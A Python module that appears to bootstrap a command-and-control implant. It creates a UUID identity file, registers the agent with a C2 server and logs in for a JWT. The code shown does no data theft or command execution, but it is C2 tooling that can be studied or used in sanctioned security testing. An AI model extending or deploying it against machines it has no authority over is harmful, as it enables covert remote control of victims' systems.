import os
import json
import uuid
import requests
from config import CONFIG_PATH, C2_URL, REGISTER_ENDPOINT, LOGIN_ENDPOINT

def load_or_create_identity():
    print(f"[DEBUG] Writing identity to: {CONFIG_PATH}")
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, "r") as f:
            return json.load(f)

    agent_id = str(uuid.uuid4())
    agent_key = str(uuid.uuid4())

    identity = {"agent_id": agent_id, "agent_key": agent_key}
    with open(CONFIG_PATH, "w") as f:
        json.dump(identity, f)

    return identity

def register(agent_id: str, agent_key: str):
    url = f"{C2_URL}{REGISTER_ENDPOINT}"
    data = {
        "agent_id": agent_id,
        "agent_key": agent_key
    }

    try:
        resp = requests.post(url, json=data)
        if resp.status_code == 200:
            print("[+] Agent registered successfully.")
        elif resp.status_code == 409:
            print("[*] Agent already registered.")
        else:
            print(f"[-] Registration failed ({resp.status_code}): {resp.text}")
            exit(1)
    except Exception as e:
        print("[-] Registration error:", str(e))
        exit(1)

def login(agent_id: str, agent_key: str) -> str:
    url = f"{C2_URL}{LOGIN_ENDPOINT}"
    data = {
        "agent_id": agent_id,
        "agent_key": agent_key
    }

    try:
        resp = requests.post(url, json=data)
        if resp.status_code == 200:
            token = resp.json()["access_token"]
            print("[+] Login successful. JWT received.")
            return token
        else:
            print(f"[-] Login failed ({resp.status_code}): {resp.text}")
            exit(1)
    except Exception as e:
        print("[-] Login error:", str(e))
        exit(1)

def initialize_agent():
    first_time = not os.path.exists(CONFIG_PATH)
    identity = load_or_create_identity()

    if first_time:
        register(identity["agent_id"], identity["agent_key"])

    token = login(identity["agent_id"], identity["agent_key"])
    return {
        "agent_id": identity["agent_id"],
        "jwt": token
    }